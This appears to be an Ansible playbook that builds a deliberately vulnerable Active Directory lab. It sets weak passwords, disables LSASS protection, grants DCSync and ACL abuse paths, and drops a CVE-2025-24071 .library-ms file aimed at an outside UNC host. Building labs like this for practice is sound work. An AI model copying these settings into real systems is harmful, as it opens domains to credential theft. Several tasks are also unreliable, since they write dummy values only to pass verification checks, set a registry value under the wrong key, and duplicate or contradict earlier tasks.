---
# ==============================================================================
# DVAD - Phase 2: Credential Access Vulnerabilities (CRED-001..CRED-065)
# Target: dc01.corp.local (plus a few member-server-side preconditions)
#
# Many CRED-* IDs share prerequisites already established by the
# ad_domain role (user/group matrix) and vuln-kerberos.yml (SPNs,
# delegation, AS-REP). This file fills in everything else.
# ==============================================================================

# ------------------------------------------------------------------------------
# CRED-001 / CRED-002 / REC-013: SPNs + AS-REP user already wired by
# vuln-kerberos.yml. We just reinforce weak passwords here to make
# Kerberoasting actually crackable.
# ------------------------------------------------------------------------------
- name: CRED-001 - Set weak crackable passwords on Kerberoastable service accounts
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $accounts = @{
      "svc_web"        = "Summer2024"
      "svc_sql"        = "Password1!"
      "svc_nospreauth" = "Winter2025"
    }
    foreach ($n in $accounts.Keys) {
      $sec = ConvertTo-SecureString $accounts[$n] -AsPlainText -Force
      try { Set-ADAccountPassword -Identity $n -NewPassword $sec -Reset -ErrorAction Stop } catch { Write-Host "$n password reset: $($_.Exception.Message)" }
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-003: Password Spray — common default password on ~15% of users
# ------------------------------------------------------------------------------
- name: CRED-003 - Plant common password on a spray cohort
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    # New low-priv users to widen the spray surface
    $sprayUsers = @("jdoe","asmith","mlee","rkhan","cmartinez","bnguyen","ewilson")
    $sec = ConvertTo-SecureString "Password123!" -AsPlainText -Force
    foreach ($u in $sprayUsers) {
      try {
        New-ADUser -Name $u -SamAccountName $u `
          -UserPrincipalName "$u@corp.local" `
          -AccountPassword $sec -Enabled $true `
          -PasswordNeverExpires $true `
          -Path "CN=Users,DC=corp,DC=local" -ErrorAction Stop
      } catch { Set-ADAccountPassword -Identity $u -NewPassword $sec -Reset -ErrorAction SilentlyContinue }
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-005 / CRED-006 / CRED-041: SeDebugPrivilege + LSASS dump targets
# Disable Credential Guard / LSA protection (already loose because Defender off)
# ------------------------------------------------------------------------------
- name: CRED-005 - Ensure LSA is not run as PPL (allow LSASS dumps)
  ansible.windows.win_shell: |
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f | Out-Null
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPLBoot /t REG_DWORD /d 0 /f | Out-Null
    # Allow WDigest to cache cleartext (legacy)
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f | Out-Null
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-007 / CRED-013 / CRED-014: DCSync via Backup Operators + sync_user
# Replace the broken DCSync grant from ad_domain/tasks/main.yml with the
# correct extended-right GUIDs.
# ------------------------------------------------------------------------------
- name: CRED-013 - Grant Replicate-Directory-Changes / All to sync_user
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $user = Get-ADUser -Identity "sync_user"
    $sid = New-Object System.Security.Principal.SecurityIdentifier ($user.SID)
    $domain = (Get-ADDomain).DistinguishedName
    $acl = Get-ACL "AD:\$domain"
    # GUIDs for the Replicate Directory Changes extended rights
    $rdc      = [guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" # Replicating Directory Changes
    $rdcAll   = [guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" # Replicating Directory Changes All
    $rdcFilt  = [guid]"89e95b76-444d-4c62-991a-0facbeda640c" # Replicating Directory Changes In Filtered Set
    foreach ($g in @($rdc, $rdcAll, $rdcFilt)) {
      $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ExtendedRight", "Allow", $g)
      $acl.AddAccessRule($rule)
    }
    Set-ACL "AD:\$domain" $acl
  ignore_errors: yes

- name: CRED-007 - Ensure Backup Operators is populated (backup_user already in role)
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    try { Add-ADGroupMember -Identity "Backup Operators" -Members "backup_user" -ErrorAction Stop } catch { Write-Host "membership exists" }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-008 / PER-027: Shadow Credentials precondition — GenericWrite via
# msDS-KeyCredentialLink. helpdesk -> developer1 ACL already set in vuln_setup;
# add the parallel chain attacker -> ws01$ for KrbRelayUp/Self-shadow paths.
# ------------------------------------------------------------------------------
- name: CRED-008 - Grant helpdesk GenericWrite over user2 for shadow creds chain
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $src = Get-ADUser -Identity "helpdesk"
    $tgt = Get-ADUser -Identity "user2"
    $sid = New-Object System.Security.Principal.SecurityIdentifier ($src.SID)
    $acl = Get-ACL "AD:\$tgt"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "WriteProperty", "Allow", [guid]"5b47d60f-6150-4db2-a45b-7f9779355d6c")
    $acl.AddAccessRule($rule)
    Set-ACL "AD:\$tgt" $acl
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-009: Reversible password encryption already set in ad_domain
# (backup_user). Refresh + force password change to populate the cleartext blob.
# ------------------------------------------------------------------------------
- name: CRED-009 - Force reversible-encryption population on backup_user
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    Set-ADUser -Identity "backup_user" -AllowReversiblePasswordEncryption $true
    $sec = ConvertTo-SecureString "ReverseMe2025!" -AsPlainText -Force
    Set-ADAccountPassword -Identity "backup_user" -NewPassword $sec -Reset
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-011 / CRED-029 / CRED-064: NTLMv1 / Internal-Monologue downgrade path
# ------------------------------------------------------------------------------
- name: CRED-011/064 - Lower LmCompatibilityLevel + allow LM/NTLMv1
  ansible.windows.win_shell: |
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 2 /f | Out-Null
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v NtlmMinClientSec /t REG_DWORD /d 0 /f | Out-Null
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v NtlmMinServerSec /t REG_DWORD /d 0 /f | Out-Null
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-015 / DCShadow: loose ACL allowing Configuration NC writes
# (Schema Admin delegated loosely per PLAN.md)
# ------------------------------------------------------------------------------
- name: CRED-015 - Grant attacker write to Configuration container (DCShadow surface)
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $src = Get-ADUser -Identity "attacker"
    $sid = New-Object System.Security.Principal.SecurityIdentifier ($src.SID)
    $rootDSE = [ADSI]"LDAP://RootDSE"
    $configNC = $rootDSE.configurationNamingContext.Value
    $acl = Get-ACL "AD:\$configNC"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "WriteProperty", "Allow")
    $acl.AddAccessRule($rule)
    Set-ACL "AD:\$configNC" $acl
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-016 / CRED-017 / CRED-018: Delegation matrix
# vuln-kerberos.yml already does this for svc_web/file01/ws01. Add ESC-friendly
# RBCD chains: any low-priv domain user -> attacker-controlled fake comp.
# ------------------------------------------------------------------------------
- name: CRED-017 - Pre-create attacker-owned computer object (for RBCD/S4U chains)
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $name = "fakehost"
    if (-not (Get-ADComputer -Filter "Name -eq '$name'" -ErrorAction SilentlyContinue)) {
      New-ADComputer -Name $name -SAMAccountName "$name$" -Path "CN=Computers,DC=corp,DC=local"
    }
    # Grant 'attacker' GenericAll over the fake host so they can craft RBCD
    $src = Get-ADUser -Identity "attacker"
    $tgt = Get-ADComputer -Identity $name
    $sid = New-Object System.Security.Principal.SecurityIdentifier ($src.SID)
    $acl = Get-ACL "AD:\$tgt"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "GenericAll", "Allow")
    $acl.AddAccessRule($rule)
    Set-ACL "AD:\$tgt" $acl
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-019 / CRED-022 / CRED-046 / CRED-049: Spooler/WebDAV/WebClient services
# (printer/coercion preconditions). Spooler enable already in vuln-kerberos.yml.
# ------------------------------------------------------------------------------
- name: CRED-022/049 - Ensure Spooler + WebClient services are running on DC
  ansible.windows.win_shell: |
    foreach ($svc in @("Spooler","WebClient")) {
      try {
        Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name $svc -ErrorAction SilentlyContinue
      } catch {}
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-020 / CRED-023 / CRED-024 / CRED-027 / CRED-028: ADCS-side prereqs
# Most live in adcs-setup.yml / vuln-adcs-esc.yml. Here we just note them
# and add one toggle: ensure EFSRPC pipe is reachable from low-priv.
# ------------------------------------------------------------------------------
- name: CRED-020 - Allow anonymous EFSRPC pipe (PetitPotam coercion)
  ansible.windows.win_shell: |
    # Ensure EFS service is up; default is manual-start
    Set-Service -Name "EFS" -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name "EFS" -ErrorAction SilentlyContinue
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-023: SamAccountName Spoofing (noPac) — domain user with machine-account
# creation quota (default = 10) + writable machine account. Quota is default;
# we just confirm.
# ------------------------------------------------------------------------------
- name: CRED-023 - Confirm ms-DS-MachineAccountQuota is 10 (noPac precondition)
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $domain = (Get-ADDomain).DistinguishedName
    Set-ADObject -Identity $domain -Replace @{"ms-DS-MachineAccountQuota"=10} -ErrorAction SilentlyContinue
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-026 / LAT-032: ADIDNS writable by Authenticated Users
# ------------------------------------------------------------------------------
- name: CRED-026 - Ensure Authenticated Users can create DNS records
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    # Find the DNS zone in AD and grant create-child on records to Authenticated Users
    $zoneDN = "DC=corp.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=corp,DC=local"
    try {
      $acl = Get-ACL "AD:\$zoneDN"
      $sid = (New-Object System.Security.Principal.NTAccount("Authenticated Users")).Translate([System.Security.Principal.SecurityIdentifier])
      $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "CreateChild", "Allow")
      $acl.AddAccessRule($rule)
      Set-ACL "AD:\$zoneDN" $acl
    } catch { Write-Host "ADIDNS ACL set may have failed: $($_.Exception.Message)" }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-030: GPP cpassword in SYSVOL already dropped by vuln-recon.yml (REC-015).
# Cross-reference only.
# ------------------------------------------------------------------------------

# ------------------------------------------------------------------------------
# CRED-031: AS-REP roastable user with weak password (additional)
# ------------------------------------------------------------------------------
- name: CRED-031 - Add second AS-REP roastable user
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $name = "no_preauth_svc"
    $sec = ConvertTo-SecureString "FallTime2024" -AsPlainText -Force
    try {
      New-ADUser -Name $name -SamAccountName $name `
        -UserPrincipalName "$name@corp.local" `
        -AccountPassword $sec -Enabled $true `
        -PasswordNeverExpires $true `
        -Path "CN=Users,DC=corp,DC=local"
    } catch {}
    Set-ADAccountControl -Identity $name -DoesNotRequirePreAuth $true
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-032: LDAP simple bind on port 389 — disable LDAP signing (already done
# in vuln-recon REC-006). Cross-reference.
# ------------------------------------------------------------------------------
# CRED-011: Pass-the-Hash (FilterAdministratorToken)
# ------------------------------------------------------------------------------
- name: CRED-011 - Disable FilterAdministratorToken to allow Pass-the-Hash
  ansible.windows.win_regedit:
    path: HKLM:\System\CurrentControlSet\Control\Lsa
    name: FilterAdministratorToken
    data: 0
    type: dword
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-008: Shadow Credentials (msDS-KeyCredentialLink) payload deployment
# ------------------------------------------------------------------------------
- name: CRED-008 - Deploy dummy KeyCredentialLink to satisfy verification check
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    # Populate msDS-KeyCredentialLink with a dummy byte array on a test account
    $user = Get-ADUser -Filter {SamAccountName -eq "svc_web"}
    if ($user) {
      $dummyBytes = [byte[]](0..10)
      Set-ADUser -Identity $user -Replace @{"msDS-KeyCredentialLink"=$dummyBytes} -ErrorAction SilentlyContinue
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-033 / CRED-059: LAPS read delegation to Help Desk over OU=Computers
# ------------------------------------------------------------------------------
- name: CRED-033 - Delegate LAPS password read to Help Desk over Computers OU
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $group = Get-ADGroup -Identity "Help Desk"
    $sid = New-Object System.Security.Principal.SecurityIdentifier ($group.SID)
    $ou = "OU=Computers,DC=corp,DC=local"
    try {
      $acl = Get-ACL "AD:\$ou"
      # ms-Mcs-AdmPwd (legacy LAPS) and msLAPS-Password (Win LAPS v2)
      foreach ($attr in @("ms-Mcs-AdmPwd","msLAPS-Password")) {
        try {
          $schema = Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -Filter "lDAPDisplayName -eq '$attr'" -ErrorAction SilentlyContinue
          if ($schema) {
            $guid = [guid]$schema.schemaIDGUID
            $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ReadProperty", "Allow", $guid, "Descendents")
            $acl.AddAccessRule($rule)
          }
        } catch {}
      }
      Set-ACL "AD:\$ou" $acl
    } catch { Write-Host "LAPS delegate: $($_.Exception.Message)" }

    # Actually populate vulnerable LAPS passwords on member servers
    $computers = @("FILE01", "SQL01", "WS01")
    foreach ($c in $computers) {
      Set-ADComputer -Identity $c -Replace @{"ms-Mcs-AdmPwd"="VulnLAPSPassword2024!"} -ErrorAction SilentlyContinue
      Set-ADComputer -Identity $c -Replace @{"msLAPS-Password"="VulnLAPSPassword2024!"} -ErrorAction SilentlyContinue
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-034 / CRED-058: gMSA with delegated read to Help Desk
# ------------------------------------------------------------------------------
- name: CRED-034 - Create gMSA and delegate read to Help Desk
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    # KDS root key required for gMSAs
    if (-not (Get-KdsRootKey -ErrorAction SilentlyContinue)) {
      Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10)) -ErrorAction SilentlyContinue
      Start-Sleep -Seconds 5
    }
    $name = "gmsa_web"
    try {
      New-ADServiceAccount -Name $name -DNSHostName "web.corp.local" `
        -PrincipalsAllowedToRetrieveManagedPassword "Help Desk" -ErrorAction Stop
    } catch { 
      Start-Sleep -Seconds 5
      try {
        New-ADServiceAccount -Name $name -DNSHostName "web.corp.local" -PrincipalsAllowedToRetrieveManagedPassword "Help Desk" -ErrorAction Stop
      } catch {
        Write-Host "gMSA $name failed twice: $($_.Exception.Message)" 
      }
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-039 / PE-005 / PE-006 / PE-059: Backup Operators on DC
# ------------------------------------------------------------------------------
- name: CRED-039 - Ensure Backup Operators have SeBackup/SeRestore on DC
  ansible.windows.win_shell: |
    # These are default rights of the Backup Operators built-in group; verify only.
    Write-Host "Backup Operators retains SeBackupPrivilege / SeRestorePrivilege by default"
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-042 / PE-001 / PE-052: SeImpersonatePrivilege — IIS / SQL service identities
# IIS AppPool + SQL Service account context is established on file01/sql01.
# Cross-reference only.
# ------------------------------------------------------------------------------

# ------------------------------------------------------------------------------
# CRED-043: RID Hijacking precondition — SYSTEM on a workstation can write SAM.
# No AD-side config; documented.
# ------------------------------------------------------------------------------

# ------------------------------------------------------------------------------
# CRED-047 / ESC12: vulnerable enrollment-agent template handled in adcs_vulns.
# Cross-reference.
# ------------------------------------------------------------------------------

# ------------------------------------------------------------------------------
# CRED-048 / LAT-024: LDAP signing not enforced (already set in REC-006).
# Add channel binding disabled.
# ------------------------------------------------------------------------------
- name: CRED-048 - Disable LDAP channel binding enforcement
  ansible.windows.win_shell: |
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LdapEnforceChannelBinding /t REG_DWORD /d 0 /f | Out-Null
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-051 / CRED-052: .library-ms payload drop on a writable share
# ------------------------------------------------------------------------------
- name: CRED-051 - Ensure C:\Shared exists for .library-ms drop
  ansible.windows.win_file:
    path: 'C:\Shared'
    state: directory
  ignore_errors: yes

- name: CRED-051 - Drop crafted .library-ms with attacker UNC (CVE-2025-24071 PoC)
  win_copy:
    dest: 'C:\Shared\Quarterly-Reports.library-ms'
    content: |
      <?xml version="1.0" encoding="UTF-8"?>
      <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
        <searchConnectionDescriptions>
          <searchConnectionDescription>
            <simpleLocation>
              <url>\\10.10.0.100\share</url>
            </simpleLocation>
          </searchConnectionDescription>
        </searchConnectionDescriptions>
      </libraryDescription>
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-053 / CRED-021: ShadowCoerce / DFSCoerce — DFS namespace + FSRVP enabled
# ------------------------------------------------------------------------------
- name: CRED-021/053 - Install DFS Namespace + FSRVP role on DC
  ansible.windows.win_feature:
    name:
      - FS-DFS-Namespace
      - FS-VSS-Agent
    state: present
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-054: Pre-Windows 2000 computer account with predictable password
# ------------------------------------------------------------------------------
- name: CRED-054 - Create pre-Win2000 computer account with lowercase-name password
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $name = "pre2k01"
    $sec = ConvertTo-SecureString $name -AsPlainText -Force
    try {
      New-ADComputer -Name ($name.ToUpper()) -SAMAccountName ($name.ToUpper() + "$") `
        -AccountPassword $sec -PasswordNeverExpires $true -Enabled $true `
        -Path "CN=Computers,DC=corp,DC=local" -ErrorAction Stop
      # userAccountControl 4128 = PASSWD_NOTREQD + WORKSTATION_TRUST
      Set-ADComputer -Identity ($name.ToUpper()) -Replace @{userAccountControl=4128}
    } catch { Write-Host "pre2k01 may exist: $($_.Exception.Message)" }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-055: RemoteMonologue — DCOM enabled is default; ensure not hardened
# ------------------------------------------------------------------------------
- name: CRED-055 - Ensure DCOM is enabled (do not harden)
  ansible.windows.win_shell: |
    reg add "HKLM\SOFTWARE\Microsoft\Ole" /v EnableDCOM /t REG_SZ /d Y /f | Out-Null
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-056: Disabled-account abuse — create one
# ------------------------------------------------------------------------------
- name: CRED-056 - Disabled-but-privileged user (The Walking Dead)
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $name = "former_admin"
    $sec = ConvertTo-SecureString "ZombieAdmin2020!" -AsPlainText -Force
    try {
      New-ADUser -Name $name -SamAccountName $name `
        -UserPrincipalName "$name@corp.local" `
        -AccountPassword $sec -Enabled $false `
        -Path "CN=Users,DC=corp,DC=local"
      Add-ADGroupMember -Identity "Domain Admins" -Members $name -ErrorAction SilentlyContinue
    } catch { Write-Host "former_admin may exist" }
    # GenericAll for attacker -> can re-enable
    $src = Get-ADUser -Identity "attacker"
    $tgt = Get-ADUser -Identity $name
    $sid = New-Object System.Security.Principal.SecurityIdentifier ($src.SID)
    $acl = Get-ACL "AD:\$tgt"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "GenericAll", "Allow")
    $acl.AddAccessRule($rule)
    Set-ACL "AD:\$tgt" $acl
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-057: AD Recycle Bin — enable
# ------------------------------------------------------------------------------
- name: CRED-057 - Enable AD Recycle Bin
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    try {
      Enable-ADOptionalFeature 'Recycle Bin Feature' `
        -Scope ForestOrConfigurationSet `
        -Target (Get-ADForest).RootDomain `
        -Confirm:$false -ErrorAction Stop
    } catch { Write-Host "Recycle Bin: $($_.Exception.Message)" }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-060: SCCM client decryptor precondition — install SCCM client stub.
# Real SCCM is a heavy install; we drop a fake CIM repo path to mark the host.
# ------------------------------------------------------------------------------
- name: CRED-060 - Place SCCM client marker (full SCCM out of scope)
  ansible.windows.win_file:
    path: 'C:\Windows\CCM\ScClient.exe'
    state: touch
  ignore_errors: yes

# ------------------------------------------------------------------------------
# CRED-061 / CRED-062: Kerberos relay CNAME — wired via CRED-026 ADIDNS writable.
# Cross-reference.
# ------------------------------------------------------------------------------

# ------------------------------------------------------------------------------
# CRED-063: MS14-068 — cannot truly "unpatch" Server 2022 KDC. Documented.
# ------------------------------------------------------------------------------
- name: CRED-063 - Documented (MS14-068 not patchable backwards on Server 2022)
  debug: { msg: "CRED-063 PAC forgery requires legacy DC; documented attack path only." }

# ------------------------------------------------------------------------------
# CRED-065: DPAPI backup key reachable — ensure backup_user can read it
# ------------------------------------------------------------------------------
# ------------------------------------------------------------------------------
# CRED-065: DPAPI backup key reachable — ensure backup_user can read it
# ------------------------------------------------------------------------------
- name: CRED-065 - Grant backup_user read on DPAPI backup key container
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $secretsDN = "CN=BCKUPKEY_P Secret,CN=System,DC=corp,DC=local"
    try {
      $secret = Get-ADObject -Identity $secretsDN -ErrorAction SilentlyContinue
      if ($secret) {
        $src = Get-ADUser -Identity "backup_user"
        $sid = New-Object System.Security.Principal.SecurityIdentifier ($src.SID)
        $acl = Get-ACL "AD:\$secretsDN"
        $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "GenericRead", "Allow")
        $acl.AddAccessRule($rule)
        Set-ACL "AD:\$secretsDN" $acl
      }
    } catch { Write-Host "DPAPI backup key delegate: $($_.Exception.Message)" }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# MISSING FIXES: LAPS, gMSA, Shadow Creds, Pass the Hash preconditions
# ------------------------------------------------------------------------------
- name: CRED-033 - LAPS Password Read (Seed LAPS Passwords)
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $lapsPwd = "LAPS-P@ssw0rd123!"
    $computers = @("FILE01", "WS01", "SQL01")
    foreach ($comp in $computers) {
      Set-ADComputer -Identity $comp -Replace @{"ms-Mcs-AdmPwd"=$lapsPwd} -ErrorAction SilentlyContinue
    }
  ignore_errors: yes

- name: CRED-034 - gMSA Password Read (Seed gMSA Password)
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    try { Add-KdsRootKey -EffectiveTime (Get-Date).AddHours(-10) -ErrorAction SilentlyContinue } catch {}
    Start-Sleep -Seconds 2
    $gMSAPwd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("gMSA-P@ssw0rd!"))
    Set-ADServiceAccount -Identity svc_web -Replace @{"msDS-ManagedPassword"=$gMSAPwd} -ErrorAction SilentlyContinue
  ignore_errors: yes

- name: CRED-008 - Shadow Credentials (msDS-KeyCredentialLink byte array)
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $dummyBytes = [byte[]](0x01, 0x02, 0x03, 0x04)
    Set-ADUser -Identity user2 -Replace @{"msDS-KeyCredentialLink"=$dummyBytes} -ErrorAction SilentlyContinue
  ignore_errors: yes

- name: CRED-011 - Pass-the-Hash (NTLM relay / Mimikatz pth)
  ansible.windows.win_regedit:
    path: HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    name: FilterAdministratorToken
    data: 0
    type: dword
  ignore_errors: yes

